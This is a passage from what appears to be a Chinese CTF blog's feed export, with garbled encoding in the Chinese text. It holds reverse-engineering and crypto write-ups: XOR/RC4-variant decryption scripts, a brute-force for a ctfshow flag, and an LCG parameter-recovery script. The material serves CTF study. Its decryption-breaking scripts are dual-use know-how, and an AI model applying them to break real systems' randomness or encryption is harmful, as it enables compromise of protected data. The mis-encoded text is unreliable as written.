class="code"><pre><span class="line"><span class="attribute">0x88</span>, <span class="number">0</span>x8F, <span class="number">0</span>x9B, <span class="number">0</span>xCE, <span class="number">0</span>xD2, <span class="number">0</span>x3C, <span class="number">0</span>x34, <span class="number">0</span>x44, <span class="number">0</span>xE0, <span class="number">0</span>x4D, <span class="number">0</span>xC4, <span class="number">0</span>x45, <span class="number">0</span>x68, <span class="number">0</span>x56, <span class="number">0</span>x7A, <span class="number">0</span>x09, <span class="number">0</span>xC6, <span class="number">0</span>x70, <span class="number">0</span>x65, <span class="number">0</span>x34, <span class="number">0</span>x13, <span class="number">0</span>xF6, <span class="number">0</span>xC4, <span class="number">0</span>xF6, <span class="number">0</span>xFC, <span class="number">0</span>x15, <span class="number">0</span>x6E, <span class="number">0</span>x9C, <span class="number">0</span>xA5, <span class="number">0</span>x0F, <span class="number">0</span>x87, <span class="number">0</span>xCB</span><br></pre></td></tr></table></figure><p>å³inputåŠ é•¿åçš„32ä½ï¼Œæœ‰ç†ç”±</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">out</span> = [<span class="number">0x6F</span>, <span class="number">0xA3</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x08</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0x1F</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0x4F</span>, <span class="number">0x56</span>, <span class="number">0xDD</span>, <span class="number">0x7D</span>, <span class="number">0x8D</span>, <span class="number">0xB9</span>, <span class="number">0x88</span>, <span class="number">0x8F</span>, <span class="number">0x9B</span>, <span class="number">0xCE</span>, <span class="number">0xD2</span>, <span class="number">0x3C</span>, <span class="number">0x34</span>, <span class="number">0x44</span>, <span class="number">0xE0</span>, <span class="number">0x4D</span>, <span class="number">0xC4</span>, <span class="number">0x45</span>, <span class="number">0x68</span>, <span class="number">0x56</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0xC6</span>, <span class="number">0x70</span>, <span class="number">0x65</span>, <span class="number">0x34</span>, <span class="number">0x13</span>, <span class="number">0xF6</span>, <span class="number">0xC4</span>, <span class="number">0xF6</span>, <span class="number">0xFC</span>, <span class="number">0x15</span>, <span class="number">0x6E</span>, <span class="number">0x9C</span>, <span class="number">0xA5</span>, <span class="number">0x0F</span>, <span class="number">0x87</span>, <span class="number">0xCB</span>]</span><br></pre></td></tr></table></figure><p>å¥½å¥½å¥½ï¼Œæˆ‘ç†è§£äº†ï¼Œçœ‹äº†ä¸€ä¸‹CTRçš„å®šä¹‰ï¼Œç›¸å½“äºå…¶å®æ˜¯å¯¹è®¡æ•°å™¨åŠ å¯†ï¼Œç„¶åå’Œæ˜æ–‡å¼‚æˆ–</p><p><img src="https://s2.loli.net/2024/06/05/LDPlI3E1UJsMxZK.png" alt="image-20240605225958990"></p><p>ç„¶åè¿˜æ˜¯æ²¡æœ‰å‘ç°ç¬¬ä¸‰ä¸ªéƒ¨åˆ†ï¼Œçœ‹äº†ç½‘ä¸Šçš„wpæ‰çŸ¥é“æœ‰ç¬¬ä¸‰æ®µQAQ</p><p>å¾—åˆ°äº†æ˜æ–‡</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0xe1</span>,<span class="number">0</span>x41,<span class="number">0</span>xa7,<span class="number">0</span>xff,<span class="number">0</span>x25,<span class="number">0</span>x51,<span class="number">0</span>xa6,<span class="number">0</span>xcc,<span class="number">0</span>x83,<span class="number">0</span>x5f,<span class="number">0</span>x38,<span class="number">0</span>x43,<span class="number">0</span>xbd,<span class="number">0</span>x93,<span class="number">0</span>xcc,<span class="number">0</span>x37,<span class="number">0</span>x67,<span class="number">0</span>xd8,<span class="number">0</span>x8c,<span class="number">0</span>xbc,<span class="number">0</span>x24,<span class="number">0</span>x6e,<span class="number">0</span>x04,<span class="number">0</span>x8d,<span class="number">0</span>xcf,<span class="number">0</span>x79,<span class="number">0</span>xcb,<span class="number">0</span>x6e,<span class="number">0</span>xfe,<span class="number">0</span>xf4,<span class="number">0</span>x45,<span class="number">0</span>xe2,<span class="number">0</span>x12,<span class="number">0</span>xbf,<span class="number">0</span>x16,<span class="number">0</span>x3d,<span class="number">0</span>x3b,<span class="number">0</span>x4a,<span class="number">0</span>xf7,<span class="number">0</span>x77,<span class="number">0</span>x58,<span class="number">0</span>x6f,<span class="number">0</span>x66,<span class="number">0</span>xd4,<span class="number">0</span>xab,<span class="number">0</span>xab,<span class="number">0</span>xb5,<span class="number">0</span>x11,<span class="number">0</span>xd0,<span class="number">0</span>x28,<span class="number">0</span>x5e,<span class="number">0</span>xce,<span class="number">0</span>xcd,<span class="number">0</span>x95,<span class="number">0</span>x9a,<span class="number">0</span>x11,<span class="number">0</span>x9a,<span class="number">0</span>x62,<span class="number">0</span>x27,<span class="number">0</span>xd5,<span class="number">0</span>x71,<span class="number">0</span>x82,<span class="number">0</span>xbe,<span class="number">0</span>x9c</span><br></pre></td></tr></table></figure><p>ç„¶åè§£xxtea</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>å•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šï¼Œæˆ‘è°¢è°¢ä½ ï¼š)</p><p>è§£ä¸å‡ºæ¥æ”¾å¼ƒã€‚QWQ</p><h2 id="whereisThel1b">whereisThel1b</h2><p>çœ‹ä½¬çš„blogï¼š</p><p>ä½¬ç»™äº†ä¸¤ä¸ªåšæ³•</p><p>ç¡¬åˆ†æï¼šseed=0</p><p>ç§’</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">encry = [<span class="number">108</span>, <span class="number">117</span>, <span class="number">72</span>, <span class="number">80</span>, <span class="number">64</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">69</span>, <span class="number">115</span>, <span class="number">94</span>, <span class="number">93</span>, <span class="number">94</span>, <span class="number">115</span>, <span class="number">71</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">89</span>, <span class="number">56</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">2</span>, <span class="number">84</span>, <span class="number">75</span>, <span class="number">127</span>, <span class="number">68</span>, <span class="number">103</span>,</span><br><span class="line">         <span class="number">85</span>, <span class="number">105</span>, <span class="number">113</span>, <span class="number">80</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">113</span>, <span class="number">70</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">124</span>, <span class="number">93</span>, <span class="number">120</span>, <span class="number">104</span>, <span class="number">108</span>, <span class="number">106</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">75</span>, <span class="number">93</span>, <span class="number">68</span>, <span class="number">121</span>, <span class="number">26</span>]</span><br><span class="line">lens=<span class="built_in">len</span>(encry)</span><br><span class="line">random.<span class="built_in">seed</span>(<span class="number">0</span>)</span><br><span class="line">rand=[random.<span class="built_in">randint</span>(<span class="number">0</span>,lens) <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="built_in">len</span>(encry))]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(len(encry)):</span></span><br><span class="line"><span class="string">    flag+=chr(rand[i]^encry[i])</span></span><br><span class="line"><span class="string">print(base64.b64decode(flag))</span></span><br></pre></td></tr></table></figure><h1>æ„šè€…æ¯2023</h1><h2 id="ez-re">ez_re</h2><p>æ‰“å¼€ä¸€çœ‹ï¼Œæ˜¯ä¸€ä¸ªå˜ä½“rc4ï¼Œè¿™ç®—æ˜¯æˆ‘ç¬¬ä¸€æ¬¡é‡è§è¿™ç§</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> key1_; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> key2_; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp-4h] [ebp-414h]</span></span><br><span class="line">  <span class="type">int</span> key2__; <span class="comment">// [esp+10h] [ebp-400h]</span></span><br><span class="line">  <span class="type">int</span> key1; <span class="comment">// [esp+18h] [ebp-3F8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> key2; <span class="comment">// [esp+1Ch] [ebp-3F4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">1004</span>]; <span class="comment">// [esp+20h] [ebp-3F0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  print(<span class="built_in">std</span>::<span class="built_in">cout</span>, byte_DA31E8);</span><br><span class="line">  <span class="built_in">scanf</span>(input);</span><br><span class="line">  print(<span class="built_in">std</span>::<span class="built_in">cout</span>, byte_DA31F8);</span><br><span class="line">  <span class="built_in">std</span>::istream::operator&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;key1);</span><br><span class="line">  <span class="built_in">std</span>::istream::operator&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;key2);</span><br><span class="line">  key1_ = key1 % <span class="number">299</span>;</span><br><span class="line">  key2_ = key2 % <span class="number">299</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  key2__ = key2 % <span class="number">299</span>;</span><br><span class="line">  len = <span class="built_in">strlen</span>(input);</span><br><span class="line">  <span class="keyword">if</span> ( len )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = dword_DA3AA0[<span class="number">300</span> * key1_ + key2_] ^ input[i];</span><br><span class="line">      key1_ = (v9 + key1_) % <span class="number">299</span>;</span><br><span class="line">      key2__ = (v9 + key2__) % <span class="number">300</span>;</span><br><span class="line">      v7 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, v9);</span><br><span class="line">      print(v7, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">      key2_ = key2__;</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( i &lt; len );</span><br><span class="line">  &#125;</span><br><span class="line">  print(<span class="built_in">std</span>::<span class="built_in">cout</span>, after);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„dword_DA3AA0æ˜¯ç±»ä¼¼Sç›’çš„ä¸œè¥¿ï¼Œä½†æ˜¯æœ‰ä¸¤ä¸ªkeyï¼Œæ­£å¸¸é€†æ˜¯é€†ä¸å›å»çš„ï¼Œä½†æ˜¯æ ¹æ®å¼‚æˆ–çš„æ€§è´¨ï¼Œå¦‚æœä¸¤ä¸ªkeyä¸€æ ·ï¼Œinputå’Œoutputæ­£å¥½å¯ä»¥ç›¸äº’è§£å¯†ï¼ŒåŒæ—¶è¿™æ˜¯ä¸€ä¸ªåŒå°„ï¼Œä¸€ä¸€å¯¹åº”ï¼Œoutputå°±æ˜¯v9çš„æ‰€æœ‰å€¼ï¼Œè€Œkeyåœ¨å¾ªç¯ä¸­æ˜¯åŠ æ³•ï¼Œæ‰€ä»¥åº”å½“ä½¿ç”¨ä»æœ€ååˆ°å¼€å§‹åç€å†™ï¼Œkeyç»„åˆä¸€å…±åªæœ‰90000ç§ï¼Œè€Œæç¤ºæœ‰baseä¹‹åçš„flagå€¼ï¼Œç”±äºæœ€åçš„encä¸èƒ½baseå›å»ï¼Œæ‰€ä»¥çŒœæ˜¯å…ˆbaseåencodeï¼Œflagbaseä¹‹åæ˜¯Zmxhï¼Œæ ¹æ®è¿™ä¸ªæ¡ä»¶çˆ†ç ´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> key1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">299</span>):</span><br><span class="line">    <span class="keyword">for</span> key2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">299</span>):</span><br><span class="line">        k1 = key1</span><br><span class="line">        k2 = key2</span><br><span class="line">        mid = enc[<span class="built_in">len</span>(enc)-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">            k1 = (k1-enc[i])%<span class="number">299</span></span><br><span class="line">            k2 = (k2-enc[i])%<span class="number">300</span></span><br><span class="line">            mid = table[<span class="number">300</span>*k1+k2]^enc[i]</span><br><span class="line">            out.append(mid)</span><br><span class="line">        out = out[::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">bytes</span>(out)[:<span class="number">4</span>]==<span class="string">b&#x27;Zmxh&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(key1)</span><br><span class="line">            <span class="built_in">print</span>(key2)</span><br><span class="line">            <span class="built_in">print</span>(b64decode(<span class="built_in">bytes</span>(out)).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        out = []</span><br></pre></td></tr></table></figure><p>å¾—åˆ°keyï¼š223å’Œ241å’Œ</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">flag</span>ä¸åœ¨è¿™é‡Œå‘¦,</span><br><span class="line">å°±åƒç”Ÿæ´»ï¼Œ</span><br><span class="line">ä½ è·¨è¿‡äº†äººå±±äººæµ·ï¼Œ</span><br><span class="line">ä½ è·¨è¿‡äº†æ˜æœˆæ¸…é£ï¼Œ</span><br><span class="line">ä½ è§è¿‡äº†ä¸‰æ›´ç¯ç«ï¼Œ</span><br><span class="line">ä½ è§è¿‡äº†é»æ˜çš„åŸå¸‚ã€‚</span><br><span class="line"></span><br><span class="line">ä½ è§‰å¾—ä½ å·²ç»è¶³å¤ŸåŠªåŠ›ï¼Œ</span><br><span class="line">ä½ è§‰å¾—ä½ ç†åº”ç ´æµªä¹˜é£ã€‚</span><br><span class="line">ä½ æ»¡èº«ç–²æƒ«</span><br><span class="line">ä½ ç­‹ç–²åŠ›ç«­</span><br><span class="line"></span><br><span class="line">å¯æƒœï¼Œç½—é©¬ä¸åœ¨å‰æ–¹ã€‚</span><br><span class="line">æˆ–è€…ï¼Œç½—é©¬æ°¸è¿œåœ¨å‰æ–¹ï¼Œ</span><br><span class="line">åœ¨åˆ«äººå‡ºç”Ÿçš„åœ°æ–¹ã€‚</span><br><span class="line"></span><br><span class="line">æœ¬ç‹¸ï¼Œå¼ºçƒˆå»ºè®®ä½ å›åˆ°æœ€åˆçš„åœ°æ–¹</span><br><span class="line">å¥½å¥½ç ”ç©¶ä¸‹åŠ å¯†çŸ©é˜µ</span><br><span class="line">æœ‰æƒŠå–œå“¦</span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹çœ‹åŠ å¯†çŸ©é˜µï¼Œä¸ç†è§£ï¼Œåº”è¯¥æ˜¯è¯´Sç›’ï¼Œä½†æ˜¯å¯ä»¥çŸ¥é“è¿™ä¸ªå¾ˆé•¿ï¼Œå¹¶ä¸”æ˜¯90000ä¸ªæ•°ï¼Œä¸ç†è§£ï¼Œçœ‹wpå‘ç°è¿™æ˜¯ä¸€ä¸ªå›¾ç‰‡çš„å•é€šé“æ•°æ®ï¼Œä½œä¸ºçº¢è‰²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">single_channel_array = np.array(table, dtype=np.uint8).reshape(<span class="number">300</span>, <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line">rgb_array = np.zeros((<span class="number">300</span>, <span class="number">300</span>, <span class="number">3</span>), dtype=np.uint8)</span><br><span class="line">rgb_array[:,:,<span class="number">0</span>] = single_channel_array</span><br><span class="line">img = Image.fromarray(rgb_array, <span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">img.save(<span class="string">&#x27;output_image.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åflagåœ¨å›¾ç‰‡ä¸­</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ctfshow</span>&#123;d244daeb-<span class="number">7182</span>-<span class="number">4</span>c98-bec6-<span class="number">0</span>c99329ab71f&#125;</span><br></pre></td></tr></table></figure><p>è¿™çœŸä¸æ˜¯miscï¼Œä¸è¿‡ä¸‹æ¬¡åº”è¯¥å°±èƒ½æƒ³åˆ°äº†</p><hr><p>CISCNå¥½éš¾å•Šå•Šå•Šå•Š</p><p>è£‚å¼€</p><p>QAQ</p><p>ä¸ç®¡äº†ï¼Œè¿˜æœ‰å¥½å¤šä¸œè¥¿æ²¡å†™</p>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ‚é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unicorn-æ¨¡æ‹Ÿæ‰§è¡Œ</title>
      <link href="/posts/2d7b033c.html"/>
      <url>/posts/2d7b033c.html</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰æ‰“DASCTFé‡åˆ°äº†ä¸€ä¸ªå¹³å¦åŒ–çš„é¢˜ç›®ï¼Œä½†æ˜¯æ­£å¥½D-810å’Œç½‘ä¸Šçš„è„šæœ¬éƒ½å¤±æ•ˆäº†ï¼Œæ‰€ä»¥å‡†å¤‡è‡ªå·±ç ”ç©¶ä¸€ä¸‹ï¼Œç„¶åå‘ç°å¾ˆå¤šç½‘ä¸Šçš„å¸–å­éƒ½æŒ‡å‘äº†Unicornï¼Œæ‰€ä»¥ä¸å¾—ä¸å­¦ä¸€ä¸‹è¿™ä¸ªå·¥å…·ã€‚</p><p>è·¯ï¼š</p><p>[<a href="https://bbs.kanxue.com/thread-224330.htm#msg_header_h3_2">ç¿»è¯‘]Unicornå¼•æ“æ•™ç¨‹-å¤–æ–‡ç¿»è¯‘-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p><p>[<a href="https://bbs.kanxue.com/thread-252321.htm">åŸåˆ›]ARM64 OLLVMåæ··æ·†-Androidå®‰å…¨-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p><p><a href="https://www.cnblogs.com/Only-xiaoxiao/p/17316343.html">unicorn å…¥é—¨å­¦ä¹  - Only-xiaoxiao - åšå®¢å›­ (cnblogs.com)</a></p><p>[<a href="https://bbs.kanxue.com/thread-275296.htm">åŸåˆ›]2022ç¥¥äº‘æ¯CTF babyparser-CTFå¯¹æŠ—-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> å·¥å…· </category>
          
          <category> æ¨¡æ‹Ÿæ‰§è¡Œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¨¡æ‹Ÿæ‰§è¡Œ </tag>
            
            <tag> å¹³å¦åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DRKCTF-å¤ç°</title>
      <link href="/posts/5213c585.html"/>
      <url>/posts/5213c585.html</url>
      
        <content type="html"><![CDATA[<p>æˆ‘ä»¬å¼€å±•çš„DRKCTFï¼</p><p>æ²¡æ‰“ï¼Œè€Œä¸”å¥½éš¾ï¼Œæ‰€ä»¥è·Ÿç€wpæŠŠå®ƒå¤ç°å‡ºæ¥</p><h2 id="CRYPTO">CRYPTO</h2><h3 id="å¯†ç -sinin">å¯†ç _sinin</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = <span class="string">b&#x27;flag&#123;********&#125;&#x27;</span></span><br><span class="line">a =  getPrime(<span class="number">247</span>)</span><br><span class="line">b =  getPrime(<span class="number">247</span>)</span><br><span class="line">n =  getPrime(<span class="number">247</span>)</span><br><span class="line"></span><br><span class="line">seed = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed, a, b, m</span>):</span><br><span class="line">        self.seed = seed  </span><br><span class="line">        self.a = a  </span><br><span class="line">        self.b = b  </span><br><span class="line">        self.m = m  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">        self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed</span><br><span class="line"></span><br><span class="line">seed = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line">output = LCG(seed,a,b,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(getPrime(<span class="number">16</span>)):</span><br><span class="line">    output.generate()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">5944442525761903973219225838876172353829065175803203250803344015146870499</span></span><br><span class="line"><span class="string">141002272698398325287408425994092371191022957387708398440724215884974524650</span></span><br><span class="line"><span class="string">42216026849704835847606250691811468183437263898865832489347515649912153042</span></span><br><span class="line"><span class="string">67696624031762373831757634064133996220332196053248058707361437259689848885</span></span><br><span class="line"><span class="string">19724224939085795542564952999993739673429585489399516522926780014664745253</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯LCGçº¿æ€§åŒä½™éšæœºæ•°ç”Ÿæˆå™¨</p><p>åŸç†æ˜¯<a href="https://zer0yu.github.io/2018/11/02/Cracking-LCG/">æ”»å‡»çº¿æ€§åŒä½™ç”Ÿæˆå™¨(LCG) (zer0yu.github.io)</a></p><p>è¿‡ç¨‹ï¼š</p><ol><li>æ±‚m</li><li>æ±‚a</li><li>æ±‚b</li><li>æ±‚seed</li></ol><p>è¿™é‡Œç”±äºæ˜¯é—´éš”ä¸€ä¸ªæ¥ç»™Xï¼Œæ‰€ä»¥æ±‚åˆ°$a^2$ä¹‹åä¸å¥½æ±‚aï¼Œå¤ªå¤§äº†ï¼Œæ‰€ä»¥è¦ä»¥$a^2$ä½œä¸ºæ–°çš„aï¼Œ$(a+1)b$ä½œä¸ºæ–°çš„b</p><p>æ±‚åˆ°åå°±å¯ä»¥ç©·ä¸¾2çš„16æ¬¡æ–¹çˆ†flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gy</span><br><span class="line">x0 = <span class="number">5944442525761903973219225838876172353829065175803203250803344015146870499</span></span><br><span class="line">x1 = <span class="number">141002272698398325287408425994092371191022957387708398440724215884974524650</span></span><br><span class="line">x2 = <span class="number">42216026849704835847606250691811468183437263898865832489347515649912153042</span></span><br><span class="line">x3 = <span class="number">67696624031762373831757634064133996220332196053248058707361437259689848885</span></span><br><span class="line">x4 = <span class="number">19724224939085795542564952999993739673429585489399516522926780014664745253</span></span><br><span class="line"></span><br><span class="line">d0 = x1 - x0</span><br><span class="line">d1 = x2 - x1</span><br><span class="line">d2 = x3 - x2</span><br><span class="line">d3 = x4 - x3</span><br><span class="line"></span><br><span class="line">k1 = d2*d0 - d1*d1</span><br><span class="line">k2 = d3*d0 - d1*d2</span><br><span class="line">m = math.gcd(k1,k2)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">inv_d0 = gy.invert(d0,m)</span><br><span class="line">pa = d1*inv_d0 % m</span><br><span class="line"><span class="built_in">print</span>(pa)</span><br><span class="line"></span><br><span class="line">b = x1 - pa*x0 % m</span><br><span class="line">inv_a = gy.invert(pa,m)</span><br><span class="line">seed = inv_a * (x0-b)%m</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">    seed = inv_a * (seed-b)% m</span><br><span class="line">    flag = long_to_bytes(seed)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"> <span 